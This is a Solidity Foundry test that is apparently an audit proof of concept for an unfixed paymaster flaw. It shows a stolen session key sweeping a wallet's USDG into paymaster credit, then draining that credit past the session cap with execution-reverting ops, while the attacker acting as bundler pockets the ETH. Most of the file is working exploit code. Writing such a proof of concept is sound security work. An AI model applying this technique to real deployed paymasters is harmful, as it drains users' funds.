// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// OPEN FINDING (docs/audit-2026-11-14.md): this test demonstrates a vulnerability that is NOT fixed yet and
// passes while it exists. When the fix lands, invert its assertions into a regression test.

// Place in contracts/test/paymaster/ (imports are relative to that folder).
// Run: forge test --match-contract SessionGasCapBypassPoC -vv
//
// SK-1: a stolen session key drains the account's whole USDG balance through the v5 paymaster, far beyond the
// session cap0. (1) One successful op moves all USDG into paymaster credit (deposit is not counted against the cap).
// (2) Every following op is made to REVERT in the policy's execution hook. The paymaster still charges gas in postOp,
// but the policy's gas debit lived in the reverted execution hook, so spent0 never moves. (3) The attacker submits
// the ops itself (EntryPoint.handleOps is permissionless) with a high priority fee and itself as beneficiary, so
// the ETH the paymaster pays out goes to the attacker, while the victim's USDG credit is debited at the signed rate.

import {PaymasterBootstrapFixture, BootstrapAccount, BootstrapFactory, BootstrapBuy} from "./PaymasterBootstrap.t.sol";
import {RuntimeMarket} from "./PaymasterRuntime.t.sol";
import {MockUSDG, MiniAccount} from "./PaymasterTestBase.sol";
import {PackedUserOperation as EpOp} from "../vendor/aa-v07/interfaces/PackedUserOperation.sol";
import {PackedUserOperation as PmOp} from "../../src/paymaster/IPaymasterV07.sol";
import {IEntryPoint} from "../vendor/aa-v07/interfaces/IEntryPoint.sol";
import {DisciplePaymasterV5 as PM} from "../../src/paymaster/DisciplePaymasterV5.sol";
import {DiscipleSessionPolicyV143 as Policy} from "../../src/session/DiscipleSessionPolicyV143.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";

contract SessionGasCapBypassPoC is PaymasterBootstrapFixture {
    RuntimeMarket market;
    PM v5;
    Policy policy5;
    uint256 sessionNonce;
    address attacker = makeAddr("attacker-bundler");

    uint256 constant FEE = 10_000_000; // honest 0.01 gwei
    uint256 constant ATTACK_FEE = 1 gwei; // attacker's own maxFee == maxPriorityFee (100x)
    uint256 constant PM_V = 300_000;
    uint256 constant PM_P = 160_000;
    uint128 constant CAP0 = 5 ether; // victim's session budget: 5 USDG (18-dec market USDG)
    bytes4 constant DEPOSIT_SEL = bytes4(keccak256("deposit(address,uint256)"));

    function setUp() public override {
        super.setUp();
        market = new RuntimeMarket();
        market.prepare(smart); // smart gets 10,000 USDG
        usdg = MockUSDG(market.usdgAddress());
        rate = 3000 ether;
        v5 = new PM(EP, address(usdg), owner, signer, treasury, rate / 10, rate * 10, 7_068_712, 150_000);
        vm.startPrank(owner);
        v5.setLaunchGasLimit(21_855_958);
        v5.setBootstrapGasLimit(4_000_000);
        vm.stopPrank();
        v5.deposit{value: 1 ether}();
        vm.fee(0);
        trade = BootstrapBuy(market.routerAddress());
        policy5 = new Policy(address(0), address(v5));
    }

    function _install() internal view override returns (bytes memory) {
        Policy.SessionConfig memory cfg;
        cfg.validUntil = uint48(block.timestamp + 1 days);
        cfg.permissions = (1 << 10) - 1;
        cfg.router = address(trade);
        cfg.launchpad = market.launchpadAddress();
        cfg.quote0 = address(usdg);
        cfg.cap0 = CAP0;
        bytes4[] memory selectors = new bytes4[](2);
        selectors[0] = MiniAccount.execute.selector;
        selectors[1] = MiniAccount.executeBatch.selector;
        bytes[] memory hooks = new bytes[](2);
        hooks[0] =
            abi.encodePacked(bytes25(abi.encodePacked(address(policy5), ENTITY, uint8(1))), abi.encode(ENTITY, cfg));
        hooks[1] = abi.encodePacked(
            bytes25(abi.encodePacked(address(policy5), ENTITY | policy5.EXEC_HOOK_FLAG(), uint8(4))),
            abi.encode(ENTITY | policy5.EXEC_HOOK_FLAG())
        );
        return abi.encodeCall(
            BootstrapAccount.installValidation,
            (bytes25(abi.encodePacked(singleSigner, ENTITY, uint8(1))), selectors, abi.encode(ENTITY, vm.addr(SESSION_PK)), hooks)
        );
    }

    function _pmd(EpOp memory op, uint256 maxTok, bool exact) internal view returns (EpOp memory) {
        bytes memory prefix = abi.encodePacked(address(v5), uint128(PM_V), uint128(PM_P));
        uint48 until = uint48(block.timestamp + 3500);
        uint48 afterTs = uint48(block.timestamp - 10);
        op.paymasterAndData = abi.encodePacked(prefix, until, afterTs, rate, maxTok, new bytes(65));
        PmOp memory packed = abi.decode(abi.encode(op), (PmOp));
        bytes32 h = exact ? v5.getOpHash(packed, until, afterTs, rate, maxTok) : v5.getHash(op.sender, until, afterTs, rate, maxTok);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, MessageHashUtils.toEthSignedMessageHash(h));
        op.paymasterAndData = abi.encodePacked(prefix, until, afterTs, rate, maxTok, r, s, v);
        return op;
    }

    function _need(EpOp memory op, uint256 fee) internal view returns (uint256) {
        uint256 units = uint128(uint256(op.accountGasLimits) >> 128) + uint128(uint256(op.accountGasLimits))
            + op.preVerificationGas + PM_V + PM_P;
        return v5.tokenCost(units * fee, rate);
    }

    /// Owner op: deploy + deferred session install + bootstrap credit deposit (same as PaymasterV5Runtime).
    function _ownerSetup(uint256 fund) internal view returns (EpOp memory op) {
        MiniAccount.Call[] memory calls = new MiniAccount.Call[](2);
        calls[0] = MiniAccount.Call(address(usdg), 0, abi.encodeCall(ERC20.approve, (address(v5), fund)));
        calls[1] = MiniAccount.Call(address(v5), 0, abi.encodeWithSelector(DEPOSIT_SEL, smart, fund));
        op.sender = smart;
        op.nonce = uint256(3) << 64;
        op.initCode = abi.encodePacked(factory, abi.encodeCall(BootstrapFactory.createSemiModularAccount, (user, 0)));
        op.callData = abi.encodeCall(MiniAccount.executeBatch, (calls));
        op.accountGasLimits = bytes32((uint256(900_000) << 128) | uint256(1_200_000));
        op.preVerificationGas = 80_000;
        op.gasFees = bytes32((FEE << 128) | FEE);
        uint256 maxTok = _need(op, FEE);
        op = _pmd(op, maxTok, true);
        bytes memory install = _install();
        uint48 deadline = uint48(block.timestamp + 120);
        bytes32 domain = keccak256(
            abi.encode(keccak256("EIP712Domain(uint256 chainId,address verifyingContract)"), block.chainid, smart)
        );
        bytes32 action = keccak256(
            abi.encode(
                keccak256("DeferredAction(uint256 nonce,uint48 deadline,bytes call)"), op.nonce, deadline, keccak256(install)
            )
        );
        bytes memory auth = abi.encodePacked(uint8(0), _nativeSig(userPk, MessageHashUtils.toTypedDataHash(domain, action)));
        bytes memory encoded = abi.encodePacked(uint168(1), deadline, install);
        op.signature = abi.encodePacked(
            uint32(encoded.length),
            encoded,
            uint32(auth.length),
            auth,
            hex"ff00",
            _nativeSig(userPk, MessageHashUtils.toEthSignedMessageHash(ep.getUserOpHash(op)))
        );
    }

    /// Session-key op, paymaster-sponsored with the reusable (unauthenticated, sender-bound) allowance quote.
    function _sessionOp(bytes memory inner, uint256 fee) internal returns (EpOp memory op) {
        op.sender = smart;
        op.nonce = (uint256(ENTITY) << 72) | sessionNonce++;
        op.callData = abi.encodePacked(bytes4(0x8dd7712f), inner);
        op.accountGasLimits = bytes32((uint256(500_000) << 128) | uint256(450_000));
        op.preVerificationGas = 80_000;
        op.gasFees = bytes32((fee << 128) | fee);
        op = _pmd(op, _need(op, fee), false);
        op.signature = abi.encodePacked(
            hex"ff00", _nativeSig(SESSION_PK, MessageHashUtils.toEthSignedMessageHash(ep.getUserOpHash(op)))
        );
    }

    function _sendAs(address beneficiary, EpOp memory op) internal returns (bool success) {
        EpOp[] memory ops = new EpOp[](1);
        ops[0] = op;
        vm.recordLogs();
        vm.prank(beneficiary, beneficiary);
        ep.handleOps(ops, payable(beneficiary));
        Vm.Log[] memory logs = vm.getRecordedLogs();
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].emitter == address(ep) && logs[i].topics[0] == IEntryPoint.UserOperationEvent.selector) {
                (, success,,) = abi.decode(logs[i].data, (uint256, bool, uint256, uint256));
            }
        }
    }

    function test_stolenSessionKey_drainsBeyondCap() public {
        // Owner onboarding: 5 USDG credit, session with a 5 USDG cap.
        assertTrue(_sendAs(bundler, _ownerSetup(5 ether)), "owner setup");
        assertTrue(policy5.sessionOf(smart, ENTITY).active);
        uint256 balBefore = usdg.balanceOf(smart);
        uint256 creditBefore = v5.creditOf(smart);
        console2.log("victim wallet USDG after setup", balBefore);

        // (1) Session key moves (almost) the whole wallet into paymaster credit. Counted against cap0: only the gas ceiling.
        uint256 sweep = 9_000 ether;
        MiniAccount.Call[] memory calls = new MiniAccount.Call[](2);
        calls[0] = MiniAccount.Call(address(usdg), 0, abi.encodeCall(ERC20.approve, (address(v5), sweep)));
        calls[1] = MiniAccount.Call(address(v5), 0, abi.encodeWithSelector(DEPOSIT_SEL, smart, sweep));
        assertTrue(_sendAs(attacker, _sessionOp(abi.encodeCall(MiniAccount.executeBatch, (calls)), FEE)), "sweep op ok");
        uint256 spentAfterSweep = policy5.sessionOf(smart, ENTITY).spent0;
        assertLt(spentAfterSweep, CAP0, "sweep only debited the small gas ceiling");
        assertGt(v5.creditOf(smart), sweep, "wallet USDG now sits in paymaster credit");

        // (2) Ops that the policy's EXECUTION hook rejects (USDG approve with no matching spend -> UsdgApproveNotExact).
        // Validation (static check) passes, so the paymaster reserves and postOp charges anyway.
        bytes memory reverting = abi.encodeCall(
            MiniAccount.execute, (address(usdg), 0, abi.encodeCall(ERC20.approve, (address(trade), 1)))
        );
        uint256 creditMid = v5.creditOf(smart);
        uint256 ethBefore = attacker.balance;
        uint256 n = 20;
        for (uint256 i; i < n; ++i) {
            bool ok = _sendAs(attacker, _sessionOp(reverting, ATTACK_FEE));
            assertFalse(ok, "execution reverted in the session hook");
        }
        uint256 drained = creditMid - v5.creditOf(smart);
        console2.log("victim credit drained by reverted ops", drained);
        console2.log("session cap0", uint256(CAP0));
        console2.log("spent0 after attack", policy5.sessionOf(smart, ENTITY).spent0);
        console2.log("attacker ETH gained (wei)", attacker.balance - ethBefore);

        assertEq(policy5.sessionOf(smart, ENTITY).spent0, spentAfterSweep, "reverted ops never debit the cap");
        assertGt(drained, CAP0, "credit drained beyond the whole session cap");
        assertGt(attacker.balance, ethBefore, "attacker-bundler receives the paymaster's ETH");
        creditBefore; // silence
    }
}
